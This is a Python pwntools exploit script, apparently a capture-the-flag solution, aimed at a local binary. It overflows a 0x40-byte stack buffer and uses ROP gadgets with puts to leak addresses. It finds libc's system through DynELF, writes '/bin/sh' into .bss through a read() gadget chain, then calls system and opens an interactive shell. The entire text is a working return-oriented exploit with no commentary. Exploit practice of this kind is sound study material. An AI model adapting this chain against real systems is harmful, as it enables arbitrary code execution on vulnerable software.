#-*- coding:utf-8 -*-
from pwn import *
import binascii

p=process('./f813b3352e834197a8872970fd2fbce4')
elf=ELF('./f813b3352e834197a8872970fd2fbce4')

puts_plt=elf.plt['puts']
pop_rdi_addr=0x400763
start_addr=0x400550
bss_addr=0x601000
pop_end_addr=0x40075A
pop_begin_addr=0x400740
read_got=elf.got['read']
#gdb.attach(p)
def leak(address):
	count=0
	payload='A'*0x40
	payload+='A'*8
	payload+=p64(pop_rdi_addr)
	payload+=p64(address)
	payload+=p64(puts_plt)
	payload+=p64(start_addr)
	payload=payload.ljust(200,'A')
	p.send(payload)
	p.recvuntil("bye~\n")
	up=""
	buf=''
	while True:
		c=p.recv(numb=1,timeout=0.5)
		count+=1
		if up=='\n' and c=='':
			buf=buf[:-1]
			buf+='\x00'
			break
		else:
			buf+=c
		up=c
	buf=buf[:4]
	log.info("%#x => %s"%(address,(buf or '').encode('hex')))
	return buf
dynelf=DynELF(leak,elf=ELF('./f813b3352e834197a8872970fd2fbce4'))
system_addr=dynelf.lookup('__libc_system','libc')
print "system_addr is "+hex(system_addr)
print "----------------write /bin/sh to bss--------------------"

payload1='A'*0x40
payload1+='A'*8
payload1+=p64(pop_end_addr)
payload1+=p64(0)
payload1+=p64(1)
payload1+=p64(read_got)
payload1+=p64(8)
payload1+=p64(bss_addr)
payload1+=p64(0)
payload1+=p64(pop_begin_addr)
payload1+='A'*56
payload1+=p64(start_addr)
payload1=payload1.ljust(200,'A')
p.send(payload1)
p.send("/bin/sh\x00")

payload2='A'*0x40
payload2+='A'*8
payload2+=p64(pop_rdi_addr)
payload2+=p64(bss_addr)
payload2+=p64(system_addr)
payload2+=p64(start_addr)
payload2=payload2.ljust(200,'A')

p.send(payload2)

p.interactive()
